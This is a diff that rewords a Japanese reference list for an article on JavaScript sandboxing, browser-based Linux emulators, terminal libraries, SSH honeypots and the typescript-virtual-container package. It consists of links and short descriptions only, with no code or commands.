-- **「なぜJSでのJSサンドボックス化が難しいか」** -- CVE-2022-36067に関するoxeye.ioのポストモーテム: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
-- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
-- **V8 Isolate内部** -- エンベッディングガイド: [v8.dev/docs/embed](https://v8.dev/docs/embed)
-- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
-- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
-- **QuickJSエンジン** -- Fabrice Bellard作: [bellard.org/quickjs](https://bellard.org/quickjs/)
-- **Denoパーミッションモデル** -- ドキュメント: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
-- **Deno 2リリース** -- 2024年10月: [deno.com/blog/v2](https://deno.com/blog/v2)
-- **TC39 ShadowRealmプロポーザル** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
-- **TC39 Compartmentsプロポーザル** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
-- **「JavaScriptコードのサンドボックス化」** -- Denoサンドボックスアプローチに関するAndrew Healeyの実践的記事: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)
+- **Node.js `vm`モジュール**。公式文書：[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
+- **Node.js `vm`安全警告**。「vmモジュールは安全機構じゃない。信用できないコード実行に使うな」：[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
+- **`vm2`**。npm：[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub：[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
+- **vm2 CVE年表**。全CVEと日付のFortiGuard警告：[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
+- **CVE-2023-29017**。非同期エラー脱出、GHSA：[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
+- **CVE-2023-32314**。ProxyとError.nameとFunction脱出、PoC gist：[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
+- **CVE-2023-37466**。完全PoC付きExploit DB entry：[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
+- **2026年vm2 CVE**。11の新脱出、分析：[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer：[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
+- **"Why Sandboxing JS in JS is Hard"**。CVE-2022-36067のoxeye.io事後分析：[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
+- **`isolated-vm`**。npm：[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub：[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
+- **V8 Isolate内部**。組み込み指南：[v8.dev/docs/embed](https://v8.dev/docs/embed)
+- **`quickjs-emscripten`**。npm：[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub：[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
+- **`@sebastianwessel/quickjs`**。npm：[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub：[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
+- **QuickJSエンジン**。Fabrice Bellard作：[bellard.org/quickjs](https://bellard.org/quickjs/)
+- **Deno権限モデル**。文書：[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
+- **Deno 2発売**。2024年10月：[deno.com/blog/v2](https://deno.com/blog/v2)
+- **TC39 ShadowRealm提案**。[github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
+- **TC39 Compartments提案**。[github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
+- **"Sandboxing JavaScript Code"**。Denoサンドボックス手法のAndrew Healey実践記事：[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)
 
-### Linuxエミュレーター
+### Linuxエミュレータ
 
-- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · デモ: [copy.sh/v86](https://copy.sh/v86)
-- **v86 OSサポートマトリックス** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
-- **SeaBIOS**（v86が使用するBIOS） -- [seabios.org](https://www.seabios.org/SeaBIOS)
-- **Bochs VBE拡張**（VGAリファレンス） -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
-- **JSLinux** -- Bellardのエミュレーター: [bellard.org/jslinux](https://bellard.org/jslinux/) · 技術ノート（TinyEMU、歴史、asm.js→Wasm）: [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
-- **TinyEMU** -- Cソース: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非公式GitHubミラー: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
-- **jor1k** -- OpenRISC JSエミュレーター: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · デモ: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
-- **CheerpX** -- ドキュメント: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreadsガイド: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
-- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · APIドキュメント: [webcontainers.io](https://webcontainers.io) · 発表記事: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ概要: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
-- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTTブログ記事: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willisonの記事: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)
+- **`v86`**。npm：[npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub：[github.com/copy/v86](https://github.com/copy/v86) · デモ：[copy.sh/v86](https://copy.sh/v86)
+- **v86 OS対応表**。[github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
+- **SeaBIOS**（v86使用BIOS）。[seabios.org](https://www.seabios.org/SeaBIOS)
+- **Bochs VBE拡張**（VGA参照）。[bochs.sourceforge.io](https://bochs.sourceforge.io/)
+- **JSLinux**。Bellardエミュレータ：[bellard.org/jslinux](https://bellard.org/jslinux/) · 技術 note（TinyEMU、歴史、asm.jsからWasm）：[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
+- **TinyEMU**。Cソース：[bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非公式GitHub鏡：[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
+- **jor1k**。JS製OpenRISCエミュレータ：[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · デモ：[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
+- **CheerpX**。文書：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads指南：[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
+- **WebContainers**。npm：[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API文書：[webcontainers.io](https://webcontainers.io) · 告知：[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ概要：[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
+- **container2wasm**。GitHub：[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTTブログ記事：[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison記事：[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)
 
-### ターミナルスタック
+### 端末 stack
 
-- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · サイト: [xtermjs.org](https://xtermjs.org)
-- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub（Microsoft）: [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)
+- **xterm.js**。npm：[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub：[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · サイト：[xtermjs.org](https://xtermjs.org)
+- **node-pty**。npm：[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft)：[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)
 
 ### ハニーポット
 
-- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · ドキュメント: [docs.cowrie.org](https://docs.cowrie.org) · サイト: [cowrie.org](https://www.cowrie.org/)
-- **Kippo** -- GitHub（アーカイブ）: [github.com/desaster/kippo](https://github.com/desaster/kippo)
-- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
-- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
-- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
-- **node-simple-ssh-honeypot** -- 最小限のNode.js SSHハニーポット: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
-- **awesome-honeypots** -- キュレーションリスト: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
-- **MITRE ATT&CK T1082** -- システム情報探索（攻撃者がハニーポットをフィンガープリントする方法）: [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)
+- **Cowrie**。GitHub：[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 文書：[docs.cowrie.org](https://docs.cowrie.org) · サイト：[cowrie.org](https://www.cowrie.org/)
+- **Kippo**。GitHub（保存）：[github.com/desaster/kippo](https://github.com/desaster/kippo)
+- **endlessh**。GitHub：[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
+- **sshesame**。GitHub：[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
+- **Lyrebird**。Docker Hub：[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
+- **node-simple-ssh-honeypot**。最小Node.js SSHハニーポット：[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
+- **awesome-honeypots**。整理一覧：[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
+- **MITRE ATT&CK T1082**。 system 情報発見（攻撃者がハニーポットをどう見分けるか）：[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)
 
 ### `typescript-virtual-container`
 
-- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
-- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
-- **ライブデモ**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
-- **アーキテクチャガイド**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
-- **`ssh2`**（SSHプロトコル実装） -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
-- **`fflate`**（VFSスナップショット圧縮） -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
-- **`ws`**（WebSocketシェルトランスポート） -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)
+- **npm**：[npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
+- **GitHub**：[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
+- **オンライン demo**：[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
+- **建築指南**：[github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
+- **`ssh2`** (SSH protocol 実装）。npm：[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub：[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
+- **`fflate`** (VFS snapshot 圧縮）。npm：[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
+- **`ws`** (WebSocket shell 転送）。npm：[npmjs.com/package/ws](https://www.npmjs.com/package/ws)
 
-### 背景資料
+### 関連読み物
 
-- **POSIXパーミッションモデル** -- Open Group仕様: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
-- **書き込み先行ログ**（VFS永続化で使用されるパターン） -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
-- **V8 Isolateモデル** -- 「Embedder's Guide」: [v8.dev/docs/embed](https://v8.dev/docs/embed)
-- **RISC-V ISA仕様**（TinyEMU/JSLinuxコンテキスト用） -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
-- **OpenRISC 1000アーキテクチャ** -- [opencores.org/or1k](https://opencores.org/or1k/)
-- **「Deno経由でPyodideサンドボックス内でPythonコードを実行する」** -- Simon Willison TIL、Wasmアプローチとの有用な対比: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
-- **「自己ホスト型QuickJSをブラウザで実行する」** -- quickjs-emscriptenバンドルサイズに関するSimon Willison TIL: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
+- **POSIX権限モデル**。Open Group仕様：[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
+- **Write-ahead logging** (VFS永続に使う模様）。[en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
+- **V8 Isolateモデル**。「Embedder's Guide」：[v8.dev/docs/embed](https://v8.dev/docs/embed)
+- **RISC-V ISA仕様**（TinyEMUやJSLinux文脈用）。[riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
+- **OpenRISC 1000建築**。[opencores.org/or1k](https://opencores.org/or1k/)
+- **"Running Python code in a Pyodide sandbox via Deno"**。Simon Willison TIL、Wasm手法との有用対比：[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
+- **"Running self-hosted QuickJS in a browser"**。Simon Willison TIL、quickjs-emscripten bundle サイズについて：[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
+
